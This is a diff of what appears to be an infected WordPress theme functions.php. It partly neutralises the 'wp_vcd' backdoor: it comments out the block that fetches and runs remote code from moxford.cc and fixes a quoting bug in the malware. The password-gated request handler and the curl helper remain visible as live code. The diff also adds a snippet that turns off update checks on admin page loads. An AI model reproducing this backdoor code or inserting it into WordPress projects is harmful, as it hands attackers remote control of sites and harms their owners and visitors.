@@ -70,7 +70,7 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 $div_code_name = "wp_vcd";
 $funcfile      = __FILE__;
 if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
 
         function file_get_contents_tcurl($url)
@@ -106,7 +106,7 @@ if(!function_exists('theme_temp_setup')) {
         }
 
 
-        $wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
+       /*  $wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
         if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
@@ -151,7 +151,7 @@ if(!function_exists('theme_temp_setup')) {
             extract(theme_temp_setup($tmpcontent));
 
         }
-
+ */
 
 
 
@@ -468,4 +468,46 @@ function remove_uncategorized_category( $args ) {
   $uncategorized = get_option( 'default_product_cat' );
   $args['exclude'] = $uncategorized;
   return $args;
+}
+
+
+
+/**
+ * Отключаем принудительную проверку новых версий WP, плагинов и темы в админке,
+ * чтобы она не тормозила, когда долго не заходил и зашел...
+ * Все проверки будут происходить незаметно через крон или при заходе на страницу: "Консоль > Обновления".
+ *
+ * @see https://wp-kama.ru/filecode/wp-includes/update.php
+ * @author Kama (https://wp-kama.ru)
+ * @version 1.0
+ */
+if( is_admin() ){
+	// отключим проверку обновлений при любом заходе в админку...
+	remove_action( 'admin_init', '_maybe_update_core' );
+	remove_action( 'admin_init', '_maybe_update_plugins' );
+	remove_action( 'admin_init', '_maybe_update_themes' );
+
+	// отключим проверку обновлений при заходе на специальную страницу в админке...
+	remove_action( 'load-plugins.php', 'wp_update_plugins' );
+	remove_action( 'load-themes.php', 'wp_update_themes' );
+
+	// оставим принудительную проверку при заходе на страницу обновлений...
+	//remove_action( 'load-update-core.php', 'wp_update_plugins' );
+	//remove_action( 'load-update-core.php', 'wp_update_themes' );
+
+	// внутренняя страница админки "Update/Install Plugin" или "Update/Install Theme" - оставим не мешает...
+	//remove_action( 'load-update.php', 'wp_update_plugins' );
+	//remove_action( 'load-update.php', 'wp_update_themes' );
+
+	// событие крона не трогаем, через него будет проверяться наличие обновлений - тут все отлично!
+	//remove_action( 'wp_version_check', 'wp_version_check' );
+	//remove_action( 'wp_update_plugins', 'wp_update_plugins' );
+	//remove_action( 'wp_update_themes', 'wp_update_themes' );
+
+	/**
+	 * отключим проверку необходимости обновить браузер в консоли - мы всегда юзаем топовые браузеры!
+	 * эта проверка происходит раз в неделю...
+	 * @see https://wp-kama.ru/function/wp_check_browser_version
+	 */
+	add_filter( 'pre_site_transient_browser_'. md5( $_SERVER['HTTP_USER_AGENT'] ), '__return_true' );
 }
